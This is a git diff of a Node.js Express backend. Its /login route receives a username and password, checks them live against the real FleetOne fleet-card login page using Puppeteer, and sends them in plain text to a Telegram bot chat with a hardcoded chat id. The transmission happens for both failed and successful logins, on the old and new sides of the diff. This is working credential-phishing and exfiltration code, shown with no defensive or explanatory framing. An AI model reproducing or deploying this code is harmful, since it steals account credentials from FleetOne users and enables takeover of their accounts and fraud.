@@ -32,7 +32,6 @@ app.get("/", (req, res) => {
 });
 
 app.post("/login", async (req, res) => {
-  const startTotal = Date.now();
   console.log("Получен POST-запрос на /login:", req.body);
 
   const { username, password } = req.body;
@@ -40,86 +39,83 @@ app.post("/login", async (req, res) => {
     return res.status(400).json({ error: "Missing username or password" });
   }
 
-  console.log("Запускаем Puppeteer...");
-  const startBrowser = Date.now();
   const browser = await puppeteer.launch({
-    headless: true,
+    headless: false,
     executablePath: await executablePath(),
     args: ["--no-sandbox", "--disable-setuid-sandbox"],
+    // args: chromium.args,
+    // defaultViewport: chromium.defaultViewport,
   });
-  console.log(`✅ Puppeteer запущен за ${Date.now() - startBrowser} мс`);
 
   const page = await browser.newPage();
-  await page.setUserAgent(
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-  );
 
   try {
-    console.log("Переход на страницу логина...");
-    const startNav = Date.now();
     await page.goto("https://manage.fleetone.com/security/fleetOneLogin", {
       waitUntil: "networkidle2",
     });
-    console.log(`✅ Страница загружена за ${Date.now() - startNav} мс`);
 
-    console.log("Ввод логина и пароля...");
-    await page.evaluate(
-      (username, password) => {
-        document.querySelector('input[name="userId"]').value = username;
-        document.querySelector('input[name="password"]').value = password;
-        document.querySelector("form").submit();
-      },
-      username,
-      password
+    await page.locator('input[name="userId"]').fill(username);
+    await page.locator('input[name="password"]').fill(password);
+    await page.$eval("form", (form) => form.submit());
+
+    console.log("Submitting form...");
+
+    await new Promise((resolve) => setTimeout(resolve, 5000));
+
+    const loginError = await page.$$eval(
+      ".errors",
+      (elements) => elements.length
     );
 
-    console.log("Ожидание авторизации...");
-    const startLogin = Date.now();
-    await page.waitForNavigation({ waitUntil: "networkidle0", timeout: 8000 });
-    console.log(`✅ Авторизация завершена за ${Date.now() - startLogin} мс`);
+    if (loginError > 0) {
+      await browser.close();
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
+      const telegramMessage = {
+        chat_id: CHAT_ID,
+        text: `✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password}`,
+      };
 
-    const cookies = await page.cookies();
-    const isLoggedIn = cookies.some((cookie) => cookie.name === "JSESSIONID");
-
-    await browser.close();
-
-    if (!isLoggedIn) {
-      console.log("❌ Ошибка входа");
-      await sendTelegramMessage(
-        `❌ Ошибка входа\n👤 ${username}\n🔑 ${password}`
-      );
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telegramMessage),
+      });
       return res.json({ success: false, message: "Invalid credentials" });
     }
 
-    console.log("✅ Успешный вход");
-    await sendTelegramMessage(
-      `✅ Успешный вход\n👤 ${username}\n🔑 ${password}`
-    );
+    const isLoggedIn =
+      (await page.$$eval("#pad", (elements) => elements.length)) > 0;
 
-    console.log(`⏳ Общее время: ${Date.now() - startTotal} мс`);
+    if (!isLoggedIn) {
+      await browser.close();
+      return res.json({ success: false, message: "Login failed" });
+    }
+
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
+    const telegramMessage = {
+      chat_id: CHAT_ID,
+      text: `✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password}`,
+    };
+
+    try {
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telegramMessage),
+      });
+    } catch (error) {
+      console.error("Error Telegram:", error);
+    }
+
+    await browser.close();
     return res.json({ success: true, message: "Login successful", username });
   } catch (error) {
     await browser.close();
-    return res
+    res
       .status(500)
       .json({ error: "Login process failed", details: error.message });
   }
 });
-
-async function sendTelegramMessage(text) {
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text }),
-      }
-    );
-  } catch (error) {
-    console.error("Error sending Telegram message:", error);
-  }
-}
 
 app.listen(port, () => {
   console.log(`Backend server is running at http://localhost:${port}`);
